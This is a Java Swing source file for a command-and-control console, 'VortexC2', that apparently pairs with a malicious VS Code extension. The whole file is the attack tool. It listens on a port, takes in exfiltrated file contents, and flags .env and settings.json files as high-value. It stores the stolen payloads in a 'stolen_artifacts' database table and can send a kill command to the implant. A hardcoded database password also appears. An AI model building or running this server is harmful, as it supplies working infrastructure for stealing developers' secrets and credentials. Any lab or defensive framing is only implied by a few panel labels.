import javax.swing.*;
import javax.swing.border.TitledBorder;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.text.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.sql.*;

public class VortexC2 extends JFrame {
    private static final int PORT = 6060;
    private static final String DB_URL = "jdbc:postgresql://localhost:5432/postgres";
    private static final String DB_USER = "postgres";
    private static final String DB_PASS = "varrie75";

    private DefaultTableModel tableModel;
    private JTextPane exfilConsole;
    private TopologyPanel topologyPanel;
    private JProgressBar severityGauge;
    private PrintWriter activeAdversaryStream;
    private int totalRiskScore = 0;

    public VortexC2() {
        setTitle("Project VORTEX: VS Code C2 Monitor");
        setSize(1100, 750);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        getContentPane().setBackground(new Color(30, 30, 30));
        setLayout(new BorderLayout());

        // --- TOP: Toplogy Graph & Triage ---
        JPanel topPanel = new JPanel(new BorderLayout());
        topPanel.setBackground(new Color(30, 30, 30));

        topologyPanel = new TopologyPanel();
        topologyPanel.setPreferredSize(new Dimension(300, 100));
        topologyPanel.setBorder(createDarkBorder("Node Connectivity"));
        topPanel.add(topologyPanel, BorderLayout.WEST);

        JPanel triagePanel = new JPanel(new BorderLayout());
        triagePanel.setBackground(new Color(30, 30, 30));
        triagePanel.setBorder(createDarkBorder("Telemetry Triage (Risk Score)"));
        severityGauge = new JProgressBar(0, 100);
        severityGauge.setStringPainted(true);
        severityGauge.setForeground(Color.RED);
        severityGauge.setBackground(Color.DARK_GRAY);
        triagePanel.add(severityGauge, BorderLayout.CENTER);

        JButton killSwitch = new JButton("TACTICAL KILL SWITCH");
        killSwitch.setBackground(Color.RED);
        killSwitch.setForeground(Color.WHITE);
        killSwitch.setFont(new Font("Arial", Font.BOLD, 14));
        killSwitch.addActionListener(e -> executeKillSwitch());
        triagePanel.add(killSwitch, BorderLayout.EAST);

        topPanel.add(triagePanel, BorderLayout.CENTER);
        add(topPanel, BorderLayout.NORTH);

        // --- CENTER: Real-Time File Integrity Feed ---
        String[] cols = {"Time", "File Path", "Action", "Risk Score"};
        tableModel = new DefaultTableModel(cols, 0);
        JTable integrityTable = new JTable(tableModel);
        integrityTable.setBackground(new Color(40, 40, 40));
        integrityTable.setForeground(Color.LIGHT_GRAY);
        integrityTable.setDefaultRenderer(Object.class, new DefaultTableCellRenderer() {
            @Override
            public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
                Component c = super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
                String file = (String) table.getModel().getValueAt(row, 1);
                if (file.contains(".env") || file.contains("settings.json") || file.contains("tasks.json")) {
                    c.setForeground(Color.RED); // Flash red for sensitive files
                } else {
                    c.setForeground(Color.GREEN);
                }
                return c;
            }
        });
        JScrollPane tableScroll = new JScrollPane(integrityTable);
        tableScroll.getViewport().setBackground(new Color(30, 30, 30));
        tableScroll.setBorder(createDarkBorder("Real-Time File Integrity Feed"));
        add(tableScroll, BorderLayout.CENTER);

        // --- BOTTOM: Exfiltration Console (JSON Syntax Highlighter) ---
        exfilConsole = new JTextPane();
        exfilConsole.setBackground(Color.BLACK);
        exfilConsole.setEditable(false);
        JScrollPane exfilScroll = new JScrollPane(exfilConsole);
        exfilScroll.setPreferredSize(new Dimension(1100, 250));
        exfilScroll.setBorder(createDarkBorder("Exfiltration Console (Intercepted Artifacts)"));
        add(exfilScroll, BorderLayout.SOUTH);
    }

    private TitledBorder createDarkBorder(String title) {
        TitledBorder border = BorderFactory.createTitledBorder(BorderFactory.createLineBorder(Color.CYAN), title);
        border.setTitleColor(Color.CYAN);
        return border;
    }

    private void executeKillSwitch() {
        if (activeAdversaryStream != null) {
            activeAdversaryStream.println("KILL_SWITCH_ENGAGED");
            appendSyntaxHighlightedJson("{\n  \"SYSTEM\": \"KILL SIGNAL BROADCASTED TO MALICIOUS EXTENSION\"\n}\n", Color.RED);
            topologyPanel.setMalicious(false); // Reset graph
        }
    }

    // Native JSON Syntax Highlighting
    private void appendSyntaxHighlightedJson(String json, Color defaultColor) {
        SwingUtilities.invokeLater(() -> {
            try {
                Document doc = exfilConsole.getDocument();
                SimpleAttributeSet keyStyle = new SimpleAttributeSet();
                StyleConstants.setForeground(keyStyle, new Color(152, 195, 121)); // Greenish

                SimpleAttributeSet valStyle = new SimpleAttributeSet();
                StyleConstants.setForeground(valStyle, new Color(229, 192, 123)); // Yellowish

                SimpleAttributeSet bracketStyle = new SimpleAttributeSet();
                StyleConstants.setForeground(bracketStyle, defaultColor != null ? defaultColor : Color.LIGHT_GRAY);

                for (char c : json.toCharArray()) {
                    String s = String.valueOf(c);
                    if (s.equals("{") || s.equals("}") || s.equals("[") || s.equals("]")) {
                        doc.insertString(doc.getLength(), s, bracketStyle);
                    } else if (s.equals("\"")) {
                        doc.insertString(doc.getLength(), s, keyStyle);
                    } else {
                        doc.insertString(doc.getLength(), s, valStyle);
                    }
                }
                doc.insertString(doc.getLength(), "\n", bracketStyle);
                exfilConsole.setCaretPosition(doc.getLength());
            } catch (Exception e) {}
        });
    }

    public void startServer() {
        new Thread(() -> {
            try (ServerSocket server = new ServerSocket(PORT)) {
                appendSyntaxHighlightedJson("{\"status\": \"C2 LISTENING ON PORT " + PORT + "\"}", Color.CYAN);

                while (true) {
                    Socket target = server.accept();
                    activeAdversaryStream = new PrintWriter(target.getOutputStream(), true);
                    topologyPanel.setMalicious(true); // Threat active

                    BufferedReader in = new BufferedReader(new InputStreamReader(target.getInputStream()));
                    String payload;
                    while ((payload = in.readLine()) != null) {
                        processPayload(payload);
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void processPayload(String json) {
        String type = parseJson(json, "type");
        String file = parseJson(json, "file");
        String data = parseJson(json, "payload");

        int risk = file.contains(".env") || file.contains("settings.json") ? 80 : 10;
        String time = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());

        // Update Integrity Feed
        SwingUtilities.invokeLater(() -> {
            tableModel.insertRow(0, new Object[]{time, file, type, risk});
            totalRiskScore = Math.min(100, totalRiskScore + (risk / 5));
            severityGauge.setValue(totalRiskScore);
        });

        // Update Exfil Console
        appendSyntaxHighlightedJson(json, null);

        // SQL Archiving
        archiveToDatabase(file, risk, data);
    }

    private void archiveToDatabase(String file, int risk, String payload) {
        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS)) {
            try (PreparedStatement ps = conn.prepareStatement("INSERT INTO compromise_ledger (file_modified, risk_score) VALUES (?, ?)")) {
                ps.setString(1, file); ps.setInt(2, risk); ps.executeUpdate();
            }
            if (payload != null && !payload.isEmpty()) {
                try (PreparedStatement ps = conn.prepareStatement("INSERT INTO stolen_artifacts (file_source, payload) VALUES (?, ?)")) {
                    ps.setString(1, file); ps.setString(2, payload); ps.executeUpdate();
                }
            }
        } catch (SQLException ignored) {}
    }

    private String parseJson(String json, String key) {
        String search = "\"" + key + "\":";
        int start = json.indexOf(search);
        if (start == -1) return "";
        start += search.length();
        int end = json.indexOf(",", start);
        if (end == -1) end = json.indexOf("}", start);
        return json.substring(start, end).replace("\"", "").trim();
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            VortexC2 c2 = new VortexC2();
            c2.setVisible(true);
            c2.startServer();
        });
    }

    // --- Custom Graphics2D Component for Node Topology ---
    class TopologyPanel extends JPanel {
        private boolean isMalicious = false;

        public void setMalicious(boolean m) {
            this.isMalicious = m;
            repaint();
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            Graphics2D g2d = (Graphics2D) g;
            g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);

            g2d.setColor(Color.WHITE);
            g2d.drawString("VS Code", 20, 55);
            g2d.drawString("C2 Server", 200, 55);

            g2d.setColor(Color.CYAN);
            g2d.fillOval(75, 40, 20, 20); // VS Code Node
            g2d.fillOval(175, 40, 20, 20); // C2 Node

            // Draw connecting line
            g2d.setStroke(new BasicStroke(3));
            if (isMalicious) {
                g2d.setColor(Color.RED); // Alert state
            } else {
                g2d.setColor(Color.GREEN); // Safe state
            }
            g2d.drawLine(95, 50, 175, 50);
        }
    }
}